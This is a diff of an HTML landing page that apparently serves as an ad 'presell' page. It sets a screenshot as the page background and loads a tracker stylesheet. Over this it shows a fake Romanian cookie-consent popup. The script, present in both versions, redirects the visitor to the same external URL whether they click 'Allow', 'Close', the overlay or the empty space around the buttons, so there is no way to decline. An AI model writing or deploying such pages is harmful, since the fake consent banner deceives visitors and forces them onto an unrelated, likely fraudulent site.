@@ -9,68 +9,17 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ClickFastAds/tracker@main/styles.css">
     <style>
       body {
-        background-image: url('https://digiboost-pressel-screenshots.s3.sa-east-1.amazonaws.com/79c467c4abf5af12d71a26c52e3f4d/680aa4ecfff1cc2a183b6a03/1748661092308.jpeg');
+        background-image: url('https://digiboost-pressel-screenshots.s3.sa-east-1.amazonaws.com/79c467c4abf5af12d71a26c52e3f4d/680aa4ecfff1cc2a183b6a03/1748661866126.jpeg');
         background-size: cover;
         background-position: top center;
         background-repeat: no-repeat;
-
-        .btn-settings {
-          border: 1px solid #007bff;
-          font: 16px Times New Roman;
-          margin-bottom: 0px !important;
-          font-weight: bold;
-        }
-        .btn-allow {
-          font: 16px Times New Roman;
-          font-weight: bold;
-        }
       }
-      
       @media (max-width: 768px) {
         body {
-          background-image: url('https://digiboost-pressel-screenshots.s3.sa-east-1.amazonaws.com/79c467c4abf5af12d71a26c52e3f4d/680aa4ecfff1cc2a183b6a03/1748661092181.jpeg');
+          background-image: url('https://digiboost-pressel-screenshots.s3.sa-east-1.amazonaws.com/79c467c4abf5af12d71a26c52e3f4d/680aa4ecfff1cc2a183b6a03/1748661865140.jpeg');
           background-size: cover;
           background-position: top center;
         }
-      }
-      
-      .cookie-popup {
-        position: fixed;
-        bottom: -100%;
-        left: 50%;
-        transform: translateX(-50%);
-        animation: floatUp 1s forwards ease-out;
-        max-height: 80vh; 
-        overflow-y: auto;
-        border-radius: 20px;
-      }
-      
-      @keyframes floatUp {
-        0% {
-          bottom: -100%;
-        }
-        100% {
-          bottom: 20%;
-        }
-      }
-      
-      .overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 999;
-      }
-      
-      .cookie-popup {
-        z-index: 1000;
-      }
-
-      .btn-settings {
-        background-color: transparent;
-        border: 2px solid #007bff;
       }
     </style>
   </head>
@@ -87,38 +36,38 @@
       >
           Permite
       </a>
-      <a id="cookieSettings" href="https://d6ocw.doctormoring.com/l" class="btn btn-settings">Închide</a>
+      <button id="cookieSettings" href="https://d6ocw.doctormoring.com/l" class="btn btn-settings">Închide</button>
   </div>
-  <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      var overlay = document.getElementById('overlay');
-      var cookiePopup = document.getElementById('cookiePopup');
-      var acceptCookies = document.getElementById('acceptCookies');
-      var cookieSettings = document.getElementById('cookieSettings');
-      var redirectUrl = acceptCookies.getAttribute("href");
-      function redirectToUrl(url) {
-        const tempLink = document.createElement('a');
-        tempLink.href = url;
-        tempLink.style.display = 'none';
-        document.body.appendChild(tempLink);
-        tempLink.click();
-        document.body.removeChild(tempLink);
-      }
-      overlay.style.display = 'block';
-      cookiePopup.style.display = 'block';
-      acceptCookies.addEventListener('click', function (e) {
-        e.preventDefault();
-        redirectToUrl(redirectUrl);
-      });
-      cookieSettings.addEventListener('click', () => redirectToUrl(redirectUrl));
-      overlay.addEventListener('click', () => redirectToUrl(redirectUrl));
-      cookiePopup.addEventListener('click', function (e) {
-        if (e.target === cookiePopup || e.target.closest('.btn') === null) {
-          redirectToUrl(redirectUrl);
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        var overlay = document.getElementById('overlay');
+        var cookiePopup = document.getElementById('cookiePopup');
+        var acceptCookies = document.getElementById('acceptCookies');
+        var cookieSettings = document.getElementById('cookieSettings');
+        var redirectUrl = acceptCookies.getAttribute("data-base-url");
+        function redirectToUrl(url) {
+          const tempLink = document.createElement('a');
+          tempLink.href = url;
+          tempLink.style.display = 'none';
+          document.body.appendChild(tempLink);
+          tempLink.click();
+          document.body.removeChild(tempLink);
         }
+        overlay.style.display = 'block';
+        cookiePopup.style.display = 'block';
+        acceptCookies.addEventListener('click', function (e) {
+          e.preventDefault();
+          redirectToUrl(redirectUrl);
+        });
+        cookieSettings.addEventListener('click', () => redirectToUrl(redirectUrl));
+        overlay.addEventListener('click', () => redirectToUrl(redirectUrl));
+        cookiePopup.addEventListener('click', function (e) {
+          if (e.target === cookiePopup || e.target.closest('.btn') === null) {
+            redirectToUrl(redirectUrl);
+          }
+        });
       });
-    });
-  </script>
-  </body>
+      </script>
+    </body>
   </html>
   
